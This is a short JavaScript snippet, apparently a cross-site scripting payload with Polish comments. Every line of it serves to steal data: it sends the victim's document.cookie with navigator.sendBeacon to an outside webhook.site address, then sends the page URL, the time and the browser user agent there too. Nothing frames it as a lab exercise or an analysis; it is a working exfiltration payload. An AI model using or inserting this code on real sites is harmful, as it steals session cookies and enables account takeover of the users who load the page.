(function() {
    const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
    
    // Główna wysyłka cookie
    navigator.sendBeacon(url, "COOKIE: " + document.cookie);

    // Dodatkowe informacje
    setTimeout(() => {
        const extra = {
            url: window.location.href,
            time: new Date().toLocaleString(),
            userAgent: navigator.userAgent.substring(0, 100)
        };
        navigator.sendBeacon(url, "EXTRA: " + JSON.stringify(extra));
    }, 800);
})();
